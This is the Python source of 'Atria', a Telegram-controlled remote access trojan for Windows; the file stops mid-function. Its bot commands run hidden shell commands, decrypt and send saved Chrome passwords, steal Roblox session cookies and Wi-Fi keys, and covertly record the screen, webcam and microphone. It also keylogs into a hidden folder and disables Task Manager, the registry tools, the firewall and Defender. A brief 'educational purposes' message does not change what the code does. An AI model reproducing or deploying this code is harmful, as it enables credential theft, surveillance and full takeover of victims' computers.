from datetime import datetime, timedelta
from Cryptodome.Cipher import AES
import pygetwindow as gw
import browser_cookie3
import numpy as np
import win32crypt
import subprocess
import pyperclip
import threading
import pyautogui
import keyboard
import requests
import sqlite3
import pyaudio
import telebot
import atexit
import base64
import ctypes
import shutil
import signal
import winreg
import psutil
import time 
import wave
import json
import sys
import cv2
import os
import io

bot_token_file = 'bot_config.txt'
current_directory = os.getcwd()

def get_resource_path():
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, bot_token_file)
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), bot_token_file)

def load_configuration():
    config_path = get_resource_path()
    
    if not os.path.exists(config_path):
        print("Configuration file not found.")
        return None, None

    with open(config_path, 'r') as file:
        config = file.readlines()
        bot_token = config[0].strip().split('=')[1]
        chat_id = config[1].strip().split('=')[1]
    
    return bot_token, chat_id

def log_message(message, log_type='keylog'):
    try:
        file_path = session_files['clipboard'] if log_type == 'clipboard' else session_files['log']
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(f'{message}\n')
    except Exception as e:
        print(f"Error writing to log file: {e}")

bot_token, chat_id = load_configuration()
try:
    bot = telebot.TeleBot(bot_token)
except Exception as e:
    log_message(f"Error initializing bot: {e}", 'error')
    bot = None

def send_message(message):
    if bot:
        bot.send_message(chat_id, message)

def start_message():
    send_message("Monitoring started!")
    send_message("Thank you for using Atria!")
    send_message("Use this script only for educational purposes!")
    send_message("To list all commands, type /help in the chatbox.")

@bot.message_handler(commands=['help'])
def send_help(message):
    help_message = (
        "Atria Commands\n"
        "/help - List available commands\n"
        "/screenshot - Capture and send a screenshot\n"
        "/upload - Upload file from users's PC\n"
        "/download <filename> - Download file from user's PC\n"
        "/shell <command> - Execute commands using a hidden shell\n"
        "/users - Shows all users in the user's PC\n"
        "/passwords - Decrypt passwords saved in Chrome\n"
        "/screenrecord <seconds> - Records the screen in x seconds\n"
        "/hide - Hides the compiled python script using hidden attribute\n"
        "/shutdown - Shuts down user's PC\n"
        "/restart - Restarts user's PC\n"
        "/tasklist - Shows running processes\n"
        "/taskkill - Kills specific processes\n"
        "/mic <seconds> - Records mic audio in x seconds\n"
        "/webscreenshot - Takes a picture in the webcam\n"
        "/info - Shows currently PC info (ip address, etc)\n"
        "/whoami - Shows the currently logged on user\n"
        "/robloxcookie - Gets the roblox cookie and sends to the bot\n"
        "/webcam <seconds> - Records the webcam in x seconds\n"
        "/wifilist - Shows all saved wifi networks\n"
        "/wifipass - Shows all wifi passwords for all saved wifi networks\n"
        "/dtaskmgr - Disables task manager\n"
        "/drun - Disables run command\n"
        "/dregistry - Disables registry tools\n"
        "/dwinsec - Disables Windows security protections\n"
        "/keylog - Sends and deletes keylog files\n"
        "/clipboard - Sends and deletes clipboard files"
    )
    bot.send_message(message.chat.id, help_message)

@bot.message_handler(commands=['screenshot'])
def send_photo(message):
    if bot:
        try:
            screenshot = pyautogui.screenshot()

            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            buffer.seek(0)

            url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
            files = {'photo': ('screenshot.png', buffer, 'image/png')}
            payload = {'chat_id': chat_id}
            requests.post(url, params=payload, files=files)
        except Exception as e:
            log_message(f"Error in send_photo: {e}", 'error')

@bot.message_handler(commands=['upload'])
def upload_command(message):
    bot.send_message(message.chat.id, "Please send a file to upload (Max 20MB).")
    bot.register_next_step_handler(message, handle_document)

def handle_document(message):
    if message.content_type == 'document':
        file_size = message.document.file_size
        file_limit = 20 * 1024 * 1024

        if file_size > file_limit:
            bot.reply_to(message, "File is too large to upload. Maximum allowed size is 20MB.")
            return

        try:
            file_id = message.document.file_id
            file_info = bot.get_file(file_id)

            downloaded_file = bot.download_file(file_info.file_path)
            file_name = message.document.file_name
            save_path = os.path.join(current_directory, file_name)

            with open(save_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.reply_to(message, f"File '{file_name}' uploaded successfully to {current_directory}!")

        except Exception as e:
            bot.reply_to(message, f"An error occurred during upload: {e}")

    else:
        bot.reply_to(message, "Please send a valid document file.")

@bot.message_handler(commands=['download'])
def download_command(message):
    global current_directory

    filename = message.text[10:].strip()
    file_path = os.path.join(current_directory, filename)

    if not os.path.isfile(file_path):
        bot.send_message(message.chat.id, "File not found in the current directory.")
        return

    file_size = os.path.getsize(file_path)
    if file_size > 50 * 1024 * 1024:
        bot.send_message(message.chat.id, "File is too large to send (exceeds 50 MB limit).")
        return

    try:
        with open(file_path, 'rb') as file:
            bot.send_document(message.chat.id, file, caption=f"File '{filename}' downloaded successfully.", timeout=300)
    except Exception as e:
        bot.send_message(message.chat.id, f"Download failed: {e}")

@bot.message_handler(commands=['shell'])
def shell_command(message):
    global current_directory

    cmd = message.text[7:]

    if cmd.startswith('cd '):
        try:
            new_directory = cmd[3:].strip()
            os.chdir(new_directory)
            current_directory = os.getcwd()
            output = f"Changed directory to {current_directory}"
        except Exception as e:
            output = f"Error: {e}"
    elif cmd == 'dir':
        try:
            entries = os.listdir(current_directory)
            formatted_entries = []
            for entry in entries:
                path = os.path.join(current_directory, entry)
                if os.path.isdir(path):
                    entry_type = '<DIR>'
                else:
                    entry_type = ''
                timestamp = time.strftime('%d %b %Y  %H:%M', time.localtime(os.path.getmtime(path)))
                formatted_entries.append(f"{timestamp}    {entry_type:>10}          {entry}")

            output = f"Directory of {current_directory}\n\n" + "\n".join(formatted_entries)
        except Exception as e:
            output = f"Error: {e}"
    
    else:
        try:
            output = subprocess.check_output(cmd, shell=True, cwd=current_directory)
            output = output.decode('utf-8')
        except subprocess.CalledProcessError as e:
            output = f"Error: {e.output.decode('utf-8')}"
        except Exception as e:
            output = f"Error: {e}"

    bot.send_message(message.chat.id, output)

@bot.message_handler(commands=['users'])
def users(message):
    try:
        com = os.popen('net user').read().strip()
        if com:
            if len(com) > 4096:
                com_chunks = [com[i:i + 4096] for i in range(0, len(com), 4096)]
                for chunk in com_chunks:
                    bot.send_message(message.chat.id, f'Result from net user:\n{chunk}')
            else:
                bot.send_message(message.chat.id, f'Result from net user:\n{com}')
        else:
            bot.send_message(message.chat.id, 'No user accounts found.')

        bot.send_message(message.chat.id, '\n' * 2)

        cm = os.popen('wmic useraccount list brief').read().strip()
        if cm:
            if len(cm) > 4096:
                cm_chunks = [cm[i:i + 4096] for i in range(0, len(cm), 4096)]
                for chunk in cm_chunks:
                    bot.send_message(message.chat.id, f'Result from wmic:\n{chunk}')
            else:
                bot.send_message(message.chat.id, f'Result from wmic:\n{cm}')
        else:
            bot.send_message(message.chat.id, 'No results from wmic.')

    except Exception as e:
        bot.send_message(message.chat.id, f'Error occurred: {str(e)}')

@bot.message_handler(commands=['passwords'])
def send_passwords(message):
    bot.send_message(message.chat.id, "Retrieving passwords...")

    try:
        key = get_encryption_key()

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        temp_db_path = "ChromeData.db"

        shutil.copyfile(db_path, temp_db_path)
        password_data = retrieve_passwords(temp_db_path, key)

        if password_data:
            send_password_file(password_data, message)
        else:
            bot.send_message(message.chat.id, "No passwords found.")

        os.remove(temp_db_path)

    except FileNotFoundError as e:
        bot.send_message(message.chat.id, "Chrome is not installed or the required files are missing.")
        log_message(f"FileNotFoundError: {e}", 'error')
    except Exception as e:
        bot.send_message(message.chat.id, f"An unexpected error occurred: {str(e)}")
        log_message(f"Unexpected error: {e}", 'error')

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        encrypted_password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def retrieve_passwords(db_path, key):
    password_data = []
    
    db = sqlite3.connect(db_path)
    cursor = db.cursor()

    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
    
    for row in cursor.fetchall():
        origin_url, action_url, username, encrypted_password, date_created, date_last_used = row
        password = decrypt_password(encrypted_password, key)
        
        if username or password:
            data_entry = {
                'origin_url': origin_url,
                'action_url': action_url,
                'username': username,
                'password': password,
                'date_created': get_chrome_datetime(date_created) if date_created else None,
                'date_last_used': get_chrome_datetime(date_last_used) if date_last_used else None
            }
            password_data.append(data_entry)
    
    cursor.close()
    db.close()
    
    return password_data

def send_password_file(password_data, message):
    file_path = "passwords.txt"
    
    with open(file_path, "w", encoding="utf-8") as file:
        for entry in password_data:
            file.write(f"Origin URL: {entry['origin_url']}\n")
            file.write(f"Action URL: {entry['action_url']}\n")
            file.write(f"Username: {entry['username']}\n")
            file.write(f"Password: {entry['password']}\n")
            if entry['date_created']:
                file.write(f"Creation Date: {entry['date_created']}\n")
            if entry['date_last_used']:
                file.write(f"Last Used: {entry['date_last_used']}\n")
            file.write("=" * 50 + "\n\n")
    
    with open(file_path, "rb") as file:
        bot.send_document(message.chat.id, file)
    
    os.remove(file_path)

@bot.message_handler(commands=['screenrecord'])
def screen(message):
    try:
        params = message.text.split()
        if len(params) != 2:
            raise ValueError("Invalid number of parameters.")
        record_time = int(params[1])
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, 'Usage: /screenrecord <time in seconds>')
        return

    bot.send_message(message.chat.id, 'Please wait...')
    
    screen_width, screen_height = pyautogui.size()
    filename = f'screen_record_{int(time.time())}.mkv'
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_video = cv2.VideoWriter(filename, fourcc, 10.0, (screen_width, screen_height))

    start_time = time.time()

    while True:
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        output_video.write(frame)

        if time.time() - start_time > record_time:
            break

    output_video.release()
    cv2.destroyAllWindows()

    try:
        with open(filename, 'rb') as screenvideo:
            bot.send_document(message.chat.id, screenvideo, timeout=300)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')
    finally:
        if os.path.exists(filename):
            os.remove(filename)

@bot.message_handler(commands=['hide'])
def hide(message):
    try:
        exe_path = sys.executable
        bot.send_message(message.chat.id, f'Full path: {exe_path}')
        
        os.popen(f'attrib +h "{exe_path}"')

        bot.send_message(message.chat.id, 'Your app is now hidden!')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    try:
        os.popen('shutdown /s /f /t 0')
        bot.send_message(message.chat.id, "PC is shutting down!")
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

@bot.message_handler(commands=['restart'])
def restart_command(message):
    try:
        os.popen('shutdown /r /f /t 0')
        bot.send_message(message.chat.id, "PC is restarting!")
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

@bot.message_handler(commands=['tasklist'])
def command_execution(message):
    try:
        MAX_MESSAGE_LENGTH = 4096

        tasklist_res = os.popen('tasklist').read().strip()
        task_lines = tasklist_res.splitlines()[3:]
        process_info = []
        seen_apps = set()

        for line in task_lines:
            parts = line.split()
            if len(parts) >= 2:
                app_name = parts[0]
                pid = parts[1]

                if app_name not in seen_apps:
                    process_info.append(f"App: {app_name}, PID: {pid}")
                    seen_apps.add(app_name)

        process_info_str = "\n".join(process_info)
        process_chunks = [process_info_str[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(process_info_str), MAX_MESSAGE_LENGTH)]

        for chunk in process_chunks:
            bot.send_message(message.chat.id, f"Tasklist (Main App Name & PID):\n\n{chunk}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")

@bot.message_handler(commands=['taskkill'])
def taskkill_command(message):
    try:
        command_params = message.text.split()

        if len(command_params) < 2:
            bot.send_message(message.chat.id, "Please provide the process name or ID. Example: /taskkill notepad.exe or /taskkill 1234")
            return
        
        process = command_params[1]

        taskkill_res = os.popen(f'taskkill /F /IM {process}').read().strip()
        if 'No tasks' in taskkill_res:
            taskkill_res = os.popen(f'taskkill /F /PID {process}').read().strip()

        bot.send_message(message.chat.id, f"Taskkill Result:\n\n{taskkill_res}")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")

@bot.message_handler(commands=['mic'])
def record_audio(message):
    default_record_time = 5
    
    try:
        command_params = message.text.split()
        if len(command_params) > 1:
            record_time = int(command_params[1])
        else:
            record_time = default_record_time
        
        if record_time <= 0:
            raise ValueError("Record time must be a positive number.")

    except ValueError as e:
        bot.reply_to(message, f"Invalid record time. Please enter a valid number. Error: {e}")
        return

    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    WAVE_OUTPUT_FILENAME = "recorded_audio.wav"

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    bot.send_message(message.chat.id, f"Recording audio for {record_time} seconds...")

    frames = []
    for _ in range(int(RATE / CHUNK * record_time)):
        data = stream.read(CHUNK)
        frames.append(data)

    bot.send_message(message.chat.id, "Done recording, sending audio.")
    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
        bot.send_audio(message.chat.id, audio_file)

    os.remove(WAVE_OUTPUT_FILENAME)

@bot.message_handler(commands=['webscreenshot'])
def take_photo(message):
    try:
        cap = cv2.VideoCapture(0)
        
        ret, frame = cap.read()
        if not ret:
            raise RuntimeError("Failed to capture image")

        photo_path = 'photo.jpg'
        cv2.imwrite(photo_path, frame)

        with open(photo_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        os.remove(photo_path)
        cap.release()
        
    except Exception as e:
        bot.send_message(message.chat.id, f"Error capturing photo: {e}")

def fetch_ip_info(endpoint):
    """Fetch IP info from a specified endpoint."""
    return os.popen(f'curl ipinfo.io/{endpoint}').read().strip()

@bot.message_handler(commands=['info'])
def information(message):
    try:
        endpoints = {
            'ip': 'IP',
            'city': 'City',
            'region': 'Region',
            'country': 'Country',
            'loc': 'Location',
            'org': 'Provider',
            'timezone': 'Timezone'
        }

        ip_info = "\n".join(f"{label}: {fetch_ip_info(endpoint)}" for endpoint, label in endpoints.items())
        bot.send_message(message.chat.id, ip_info)

        system_info_raw = os.popen('wmic os get /format:list').read().strip()
        useful_info = extract_useful_system_info(system_info_raw)

        bot.send_message(message.chat.id, f"\nSystem Information:\n{useful_info}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

def extract_useful_system_info(system_info):
    useful_keys = [
        "Caption", "OSArchitecture", "Version", "BuildNumber", "SerialNumber", 
        "TotalVisibleMemorySize", "FreePhysicalMemory", "InstallDate", "LastBootUpTime", 
        "SystemDrive", "WindowsDirectory", "SystemDirectory", "NumberOfProcesses"
    ]

    lines = system_info.split("\n")
    useful_info = []

    for line in lines:
        key, value = line.split('=', 1) if '=' in line else (None, None)
        if key and key.strip() in useful_keys:
            useful_info.append(line)

    return "\n".join(useful_info)

@bot.message_handler(commands=['whoami'])
def whoami_command(message):
    try:
        result = os.popen('whoami').read().strip()
        bot.send_message(message.chat.id, f"User: {result}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

def get_roblox_cookies():
    """Retrieve Roblox cookies from various browsers."""
    for browser in [browser_cookie3.chrome, browser_cookie3.brave, browser_cookie3.firefox,
                    browser_cookie3.chromium, browser_cookie3.edge, browser_cookie3.opera]:
        try:
            cookies = browser(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.value
        except Exception:
            continue
    return None

@bot.message_handler(commands=['robloxcookie'])
def roblox(message):
    try:
        roblox_cookie = get_roblox_cookies()
        
        if roblox_cookie:
            bot.send_message(message.chat.id, f'Security Cookie Value: {roblox_cookie}')
            with open("roblox_cookie.txt", "w", encoding="utf-8") as file:
                file.write(f'Security Cookie Value: {roblox_cookie}')
            with open("roblox_cookie.txt", "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.send_message(message.chat.id, "No Roblox security cookie found.")
    
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')
    
    finally:
        if os.path.exists('roblox_cookie.txt'):
            os.remove('roblox_cookie.txt')

@bot.message_handler(commands=['webcam'])
def webcam_command(message):
    try:
        params = message.text.split()
        if len(params) != 2:
            raise ValueError("Usage: /webcam <time in seconds>")
        
        record_time = int(params[1])
        
        msg = bot.send_message(message.chat.id, 'Enter camera index (0 for default, 1, etc.):')
        bot.register_next_step_handler(msg, lambda msg: handle_camera_index(msg, record_time))
    
    except ValueError as e:
        bot.send_message(message.chat.id, f'Error: {e}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

def handle_camera_index(message, record_time):
    try:
        camera_index = int(message.text)
        
        bot.send_message(message.chat.id, 'Recording... Please wait.')
        record_video(message, camera_index, record_time)
    
    except ValueError:
        bot.send_message(message.chat.id, 'Invalid camera index. Please enter a valid number.')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

def record_video(message, camera_index, record_time):
    output_file = 'webcam_recording.mkv'

    try:
        cap = cv2.VideoCapture(camera_index)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        output_v = cv2.VideoWriter(output_file, fourcc, 20.0, (640, 480))
        start_time = time.time()

        while True:
            ret, frame = cap.read()
            if ret:
                output_v.write(frame)
                if time.time() - start_time > record_time:
                    break
            else:
                break

        cap.release()
        output_v.release()
        cv2.destroyAllWindows()

        with open(output_file, 'rb') as video_file:
            bot.send_document(message.chat.id, video_file, timeout=122)
    
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

    finally:
        if os.path.exists(output_file):
            os.remove(output_file)

@bot.message_handler(commands=['wifilist'])
def list_wifi_profiles(message):
    try:
        wifi_list = os.popen('netsh wlan show profile').read().strip()
        bot.send_message(message.chat.id, f'Available WiFi networks:\n{wifi_list}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

@bot.message_handler(commands=['wifipass'])
def get_wifi_password(message):
    try:
        name = message.text.split('/wifipass', 1)[1].strip()
        password_info = os.popen(f'netsh wlan show profile name="{name}" key=clear').read().strip()
        bot.send_message(message.chat.id, f'WiFi Password Info:\n{password_info}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')

@bot.message_handler(commands=['dtaskmgr'])
def handle_disable_task_manager(message):
    try:
        reg_key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE)
    except FileNotFoundError:
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")

    try:
        try:
            value, _ = winreg.QueryValueEx(reg_key, "DisableTaskMgr")
            if value == 1:
                bot.reply_to(message, "Task Manager is already disabled.")
                return
        except FileNotFoundError:
            pass

        command = r'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
        if ret < 32:
            raise ctypes.WinError(ctypes.get_last_error())
        else:
            bot.reply_to(message, "Task Manager has been disabled.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

    winreg.CloseKey(reg_key)

@bot.message_handler(commands=['drun'])
def handle_disable_run_command(message):
    try:
        reg_key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_READ | winreg.KEY_WRITE)
    except FileNotFoundError:
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")

    try:
        try:
            value, _ = winreg.QueryValueEx(reg_key, "NoRun")
            if value == 1:
                bot.reply_to(message, "Run command is already disabled.")
                return
        except FileNotFoundError:
            pass

        command = r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f'
        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
        if ret < 32:
            raise ctypes.WinError(ctypes.get_last_error())
        else:
            bot.reply_to(message, "Run command has been disabled.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

    winreg.CloseKey(reg_key)

@bot.message_handler(commands=['dregistry'])
def handle_disable_registry_tools(message):
    try:
        reg_key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ | winreg.KEY_WRITE)
    except FileNotFoundError:
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")

    try:
        try:
            value, _ = winreg.QueryValueEx(reg_key, "DisableRegistryTools")
            if value == 1:
                bot.reply_to(message, "Registry Editor is already disabled.")
                return
        except FileNotFoundError:
            pass

        command = r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f'
        shell32 = ctypes.WinDLL('shell32', use_last_error=True)
        ret = shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + command, None, 1)
        if ret < 32:
            raise ctypes.WinError(ctypes.get_last_error())
        else:
            bot.reply_to(message, "Registry Editor has been disabled.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

    winreg.CloseKey(reg_key)

@bot.message_handler(commands=['dwinsec'])
def handle_disable_windows_security(message):
    error_log_path = os.path.join(os.getenv('TEMP'), 'disable_windows_security_errors.log')
    script_path = os.path.join(os.getenv('TEMP'), 'disable_windows_security.ps1')

    powershell_script = f"""
    $error.Clear()
    $errorLog = '{error_log_path}'
    
    try {{
        Add-MpPreference -ExclusionExtension '*' 2>>$errorLog
        Set-MpPreference -EnableControlledFolderAccess Disabled 2>>$errorLog
        Set-MpPreference -PUAProtection disable 2>>$errorLog
        Set-MpPreference -HighThreatDefaultAction 6 -Force 2>>$errorLog
        Set-MpPreference -ModerateThreatDefaultAction 6 -Force 2>>$errorLog
        Set-MpPreference -LowThreatDefaultAction 6 -Force 2>>$errorLog
        Set-MpPreference -SevereThreatDefaultAction 6 -Force 2>>$errorLog
        Set-MpPreference -ScanScheduleDay 8 2>>$errorLog
        netsh advfirewall set allprofiles state off
        Set-MpPreference -MAPSReporting 0 2>>$errorLog
        Set-MpPreference -SubmitSamplesConsent 2 2>>$errorLog

        if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations')) {{
            New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations' -Force
        }}
        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations' -Name 'LowRiskFileTypes' -Value '.vbs;.js;.exe;.bat;.cmd;.msi;.reg;.ps1;' 2>>$errorLog
        
        if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1')) {{
            New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1' -Force
        }}
        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\1' -Name '1806' -Value '0' 2>>$errorLog
        
        if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2')) {{
            New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2' -Force
        }}
        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2' -Name '1806' -Value '0' 2>>$errorLog
        
        if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3')) {{
            New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3' -Force
        }}
        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3' -Name '1806' -Value '0' 2>>$errorLog
        
        if (-not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4')) {{
            New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4' -Force
        }}
        Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4' -Name '1806' -Value '0' 2>>$errorLog
    }} catch {{
        Write-Host "An error occurred: $($_.Exception.Message)"
    }} finally {{
        if ($error.Count -gt 0) {{
            $error | Out-File -FilePath $errorLog -Append
            exit 1
        }}
    }}
    """

    try:
        with open(script_path, 'w') as script_file:
            script_file.write(powershell_script)
        
        result = subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path],
            shell=True,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        error_output = result.stderr.decode('utf-8').strip()
        if result.returncode == 0:
            bot.send_message(message.chat.id, "Windows security settings have been disabled.")
        else:
            if os.path.exists(error_log_path):
                with open(error_log_path, 'r') as f:
                    error_content = f.read().strip()
                bot.send_message(message.chat.id, f"Errors occurred:\n{error_content}")
            else:
                bot.send_message(message.chat.id, f"An error occurred: {error_output}")
    
    except subprocess.CalledProcessError as e:
        bot.send_message(message.chat.id, f"An error occurred: {e}")
    
    finally:
        if os.path.exists(script_path):
            os.remove(script_path)
        if os.path.exists(error_log_path):
            os.remove(error_log_path)

@bot.message_handler(commands=['keylog'])
def keylog(message):
    folder_path, log_files = get_app_dir()

    if folder_path is None or not log_files:
        bot.send_message(message.chat.id, "No log files found on any drive.")
        return

    keylog_found = False
    for log_file in log_files:
        file_path = os.path.join(folder_path, log_file)

        if "keylog" in log_file and log_file.endswith('.txt'):
            keylog_found = True
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption=log_file)

            os.remove(file_path)

    if keylog_found:
        bot.send_message(message.chat.id, "Keylog file sent and deleted from drive: " + folder_path)
    else:
        bot.send_message(message.chat.id, "No keylog file found.")

@bot.message_handler(commands=['clipboard'])
def dclipboard(message):
    folder_path, log_files = get_app_dir()

    if folder_path is None or not log_files:
        bot.send_message(message.chat.id, "No log files found on any drive.")
        return

    clipboard_found = False
    for log_file in log_files:
        file_path = os.path.join(folder_path, log_file)

        if "clipboard" in log_file and log_file.endswith('.txt'):
            clipboard_found = True
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption=log_file)

            os.remove(file_path)

    if clipboard_found:
        bot.send_message(message.chat.id, "Clipboard file sent and deleted from drive: " + folder_path)
    else:
        bot.send_message(message.chat.id, "No clipboard file found.")

def get_app_dir():
    partitions = psutil.disk_partitions()
    drives = [p.mountpoint for p in partitions if p.device]

    for drive in drives:
        if os.path.exists(drive):
            folder_path = os.path.join(drive, 'Driver')

            if not os.path.exists(folder_path):
                os.makedirs(folder_path)
                print(f"Created folder: {folder_path}")

            result = ctypes.windll.kernel32.SetFileAttributesW(folder_path, 0x02)
            if result == 0:
                print(f"Failed to set {folder_path} as hidden. Error code: {ctypes.GetLastError()}")
            else:
                print(f"The folder {folder_path} is now hidden.")

            log_files = [f for f in os.listdir(folder_path) if f.endswith('.txt')]
            return folder_path, log_files

    return None, None

def create_session_files():
    folder_path, log_files = get_app_dir()
    if folder_path is None:
        print("No folder path returned.")
        return

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    return {
        'log': os.path.join(folder_path, f'keylog_{timestamp}.txt'),
        'clipboard': os.path.join(folder_path, f'clipboard_{timestamp}.txt')
    }

def log_sentence():
    global sentence
    if sentence:
        log_message(f' - {sentence}')
        sentence = ''

def monitor_active_window():
    previous_window = None
    while True:
        try:
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            active_window = gw.getActiveWindow()
            if active_window:
                window_title = active_window.title
                if window_title != previous_window:
                    if previous_window is not None:
                        log_sentence()
                    log_message(f'[{current_time}] Active Window: {window_title}')
                    previous_window = window_title
            else:
                log_message(f'[{current_time}] Active Window: No active window')
        except Exception as e:
            log_message(f"Error in monitor_active_window: {e}", 'error')
        time.sleep(0.1)

def on_key_press(event):
    try:
        global sentence
        if event.name == 'enter':
            log_sentence()
        elif event.name == 'space':
            sentence += ' '
        elif len(event.name) == 1:
            sentence += event.name
        elif event.name == 'backspace' and sentence:
            sentence = sentence[:-1]
        else:
            sentence += f'[{event.name}]'
    except Exception as e:
        log_message(f"Error in on_key_press: {e}", 'error')

def monitor_clipboard():
    global previous_clipboard_content
    try:
        while True:
